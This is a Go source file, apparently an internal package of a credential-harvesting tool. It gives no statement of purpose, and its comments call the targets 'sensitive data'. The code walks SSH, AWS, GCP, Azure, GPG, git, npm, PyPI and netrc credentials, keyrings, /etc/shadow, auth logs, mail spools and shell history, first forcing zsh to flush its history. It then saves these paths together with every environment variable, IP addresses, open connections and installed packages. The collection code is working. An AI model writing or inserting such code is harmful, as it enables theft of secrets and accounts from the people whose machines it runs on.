package internal

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// ScanSensitiveFiles collects all files from specified paths in parallel, handling inaccessible paths gracefully.
func ScanSensitiveFiles(outputDir string) ([]string, error) {
	homeDir, _ := os.UserHomeDir()

	// Strategic paths for gathering sensitive data
	paths := []string{
		// User-specific directories and files
		filepath.Join(homeDir, ".ssh"),                  // SSH keys
		filepath.Join(homeDir, ".aws"),                  // AWS credentials
		filepath.Join(homeDir, ".gnupg"),                // GPG keys
		filepath.Join(homeDir, ".git-credentials"),      // Git credentials
		filepath.Join(homeDir, ".gitconfig"),            // Git global config
		filepath.Join(homeDir, ".docker"),               // Docker config
		filepath.Join(homeDir, ".kube"),                 // Kubernetes config
		filepath.Join(homeDir, ".config/gcloud"),        // Google Cloud config
		filepath.Join(homeDir, ".azure"),                // Azure config
		filepath.Join(homeDir, ".openvpn"),              // OpenVPN config
		filepath.Join(homeDir, ".profile"),              // User profile
		filepath.Join(homeDir, ".npmrc"),                // NPM credentials
		filepath.Join(homeDir, ".pypirc"),               // Python package repository credentials
		filepath.Join(homeDir, ".netrc"),                // Netrc (generic credentials)
		filepath.Join(homeDir, ".local/share/keyrings"), // Keyrings
		filepath.Join(homeDir, "secrets"),               // Generic secrets folder
		filepath.Join(homeDir, ".bashrc"),               // Bash configuration
		filepath.Join(homeDir, ".zshrc"),                // Zsh configuration

		// System-level directories and files
		"/etc/passwd",              // User information
		"/etc/shadow",              // User hashed credentials
		"/etc/group",               // Group information
		"/etc/hostname",            // System hostname
		"/etc/hosts",               // Hosts file
		"/etc/ssl",                 // SSL certificates
		"/etc/crontab",             // System-wide crontab
		"/etc/cron.d",              // Directory for cron jobs
		"/etc/cron.daily",          // Daily cron jobs
		"/etc/cron.weekly",         // Weekly cron jobs
		"/etc/cron.monthly",        // Monthly cron jobs
		"/etc/cron.hourly",         // Hourly cron jobs
		"/var/spool/cron",          // User-specific crontab files
		"/var/spool/cron/crontabs", // Cron job configurations
		"/var/spool/mail",          // Users-specific email

		// Logs and temporary files
		"/var/log/auth.log", // Authentication logs (Linux-specific)
		"/var/log/secure",   // Secure logs (Red Hat/CentOS-specific)
		"/var/log/messages", // General system logs
		"/var/log/syslog",   // System log (Debian/Ubuntu-specific)
		"/var/log/dpkg.log", // Package installation logs (Debian/Ubuntu-specific)
		"/var/log/yum.log",  // Package installation logs (Red Hat/CentOS-specific)
		"/tmp/ssh-*",        // Temporary SSH files
		"/tmp/vim*",         // Temporary Vim files

		// Detect shell history
		DetectDefaultShell(), // Shell history
	}

	var wg sync.WaitGroup
	fileChan := make(chan string, len(paths))
	errChan := make(chan error, len(paths))

	// Use a goroutine for each path
	for _, path := range paths {
		wg.Add(1)
		go func(path string) {
			defer wg.Done()
			files := expandPath(path)
			for _, file := range files {
				if _, err := os.Stat(file); err == nil {
					fileChan <- file
				} else {
					errChan <- fmt.Errorf("failed to access %s: %v", file, err)
				}
			}
		}(path)
	}

	// Wait for all goroutines to complete
	go func() {
		wg.Wait()
		close(fileChan)
		close(errChan)
	}()

	// Collect results and handle errors
	var files []string
	for file := range fileChan {
		files = append(files, file)
	}

	// Log errors but proceed
	for err := range errChan {
		fmt.Println(err)
	}

	// Save system info
	systemInfoPath, err := saveSystemInfo(outputDir)
	if err != nil {
		return nil, err
	}

	// Add system info to the files list
	files = append(files, systemInfoPath)

	return files, nil
}

// expandPath expands directories into a list of files.
func expandPath(path string) []string {
	var fileList []string
	err := filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() {
			fileList = append(fileList, p)
		}
		return nil
	})
	if err != nil {
		return []string{path} // Return the original path if walk fails
	}
	return fileList
}

// saveSystemInfo retrieves and saves environment variables, OS info, and IP addresses.
func saveSystemInfo(outputDir string) (string, error) {
	systemInfo, err := GetSystemInfo()
	if err != nil {
		return "", fmt.Errorf("failed to retrieve system info: %w", err)
	}

	// Convert system info to JSON
	data, err := json.MarshalIndent(systemInfo, "", "  ")
	if err != nil {
		return "", fmt.Errorf("failed to serialize system info: %w", err)
	}

	// Create the output directory if it doesn't exist
	if err := os.MkdirAll(outputDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create output directory: %w", err)
	}

	// Write system info to a file
	filePath := filepath.Join(outputDir, "system_info.json")
	err = os.WriteFile(filePath, data, 0644)
	if err != nil {
		return "", fmt.Errorf("failed to write system info to file: %w", err)
	}

	return filePath, nil
}

// GetSystemInfo retrieves environment variables, OS info, and IP addresses.
func GetSystemInfo() (map[string]interface{}, error) {
	info := make(map[string]interface{})

	// Get environment variables
	info["env_vars"] = os.Environ()

	// Get OS info
	info["os"] = map[string]string{
		"os":      runtime.GOOS,
		"arch":    runtime.GOARCH,
		"num_cpu": fmt.Sprintf("%d", runtime.NumCPU()),
	}

	// Get current user and hostname
	user, err := os.UserHomeDir()
	if err == nil {
		info["current_user"] = user
	} else {
		info["current_user"] = "N/A"
	}

	hostname, err := os.Hostname()
	if err == nil {
		info["hostname"] = hostname
	} else {
		info["hostname"] = "N/A"
	}

	// Get local IP addresses
	var localIPs []string
	addrs, err := net.InterfaceAddrs()
	if err == nil {
		for _, addr := range addrs {
			if ip, ok := addr.(*net.IPNet); ok && !ip.IP.IsLoopback() {
				if ip.IP.To4() != nil {
					localIPs = append(localIPs, ip.IP.String())
				}
			}
		}
	}
	info["local_ips"] = localIPs

	// Get public IP address
	publicIP, err := getPublicIP()
	if err == nil {
		info["public_ip"] = publicIP
	} else {
		info["public_ip"] = "N/A"
	}

	// Get system uptime
	uptime, err := getSystemUptime()
	if err == nil {
		info["uptime"] = uptime
	} else {
		info["uptime"] = "N/A"
	}

	// Get load averages (Linux-specific)
	loadAvg, err := getLoadAverage()
	if err == nil {
		info["load_avg"] = loadAvg
	} else {
		info["load_avg"] = "N/A"
	}

	// Get mounted file systems
	mountedFS, err := getMountedFileSystems()
	if err == nil {
		info["mounted_filesystems"] = mountedFS
	} else {
		info["mounted_filesystems"] = "N/A"
	}

	// Get active network connections
	connections, err := getActiveConnections()
	if err == nil {
		info["active_connections"] = connections
	} else {
		info["active_connections"] = "N/A"
	}

	// Get installed packages (Linux-specific)
	packages, err := getInstalledPackages()
	if err == nil {
		info["installed_packages"] = packages
	} else {
		info["installed_packages"] = "N/A"
	}

	return info, nil
}

// Helper functions

func getSystemUptime() (string, error) {
	if runtime.GOOS == "linux" {
		data, err := ioutil.ReadFile("/proc/uptime")
		if err != nil {
			return "", err
		}
		fields := strings.Fields(string(data))
		uptimeSeconds, err := strconv.ParseFloat(fields[0], 64)
		if err != nil {
			return "", err
		}
		uptime := time.Duration(uptimeSeconds) * time.Second
		return uptime.String(), nil
	}
	return "Unsupported OS for uptime", nil
}

func getLoadAverage() (string, error) {
	if runtime.GOOS == "linux" {
		data, err := ioutil.ReadFile("/proc/loadavg")
		if err != nil {
			return "", err
		}
		return string(data), nil
	}
	return "Unsupported OS for load average", nil
}

func getMountedFileSystems() ([]string, error) {
	var result []string
	file, err := os.Open("/proc/mounts")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	data, err := ioutil.ReadAll(file)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) > 1 {
			result = append(result, fields[1]) // Append mount point
		}
	}

	return result, nil
}

func getActiveConnections() ([]string, error) {
	if runtime.GOOS == "linux" {
		out, err := exec.Command("ss", "-tulnp").Output()
		if err != nil {
			return nil, err
		}
		return strings.Split(string(out), "\n"), nil
	}
	return nil, fmt.Errorf("unsupported os for active connections")
}

func getInstalledPackages() ([]string, error) {
	var packages []string
	if runtime.GOOS == "linux" {
		cmds := [][]string{
			{"dpkg", "-l"},      // Debian-based systems
			{"rpm", "-qa"},      // Red Hat-based systems
			{"pacman", "-Q"},    // Arch-based systems
			{"apk", "info"},     // Alpine Linux
			{"flatpak", "list"}, // Flatpak
			{"snap", "list"},    // Snap
		}
		for _, cmd := range cmds {
			out, err := exec.Command(cmd[0], cmd[1:]...).Output()
			if err == nil {
				packages = append(packages, strings.Split(string(out), "\n")...)
			}
		}
		return packages, nil
	}
	return nil, fmt.Errorf("unsupported os for installed packages")
}

// getPublicIP fetches the public IP address of the system.
func getPublicIP() (string, error) {
	resp, err := http.Get("https://api.ipify.org")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	var buf bytes.Buffer
	_, err = buf.ReadFrom(resp.Body)
	if err != nil {
		return "", err
	}

	return buf.String(), nil
}

// DetectDefaultShell detects the default shell and returns the history file path.
func DetectDefaultShell() string {
	currentUser, err := user.Current()
	if err != nil {
		return ""
	}

	shell := os.Getenv("SHELL")
	if shell == "" {
		shell = "/bin/bash" // Default fallback
	}

	switch filepath.Base(shell) {
	case "zsh":
		flushZshHistory()
		return filepath.Join(currentUser.HomeDir, ".zsh_history")
	case "bash":
		return filepath.Join(currentUser.HomeDir, ".bash_history")
	default:
		return "" // Unsupported shell
	}
}

func flushZshHistory() {
	cmd := exec.Command("zsh", "-c", "fc -W")
	if err := cmd.Run(); err != nil {
		// Log the error or document why it is safe to ignore
		fmt.Println("Warning: Failed to flush Zsh history:", err)
	}
}
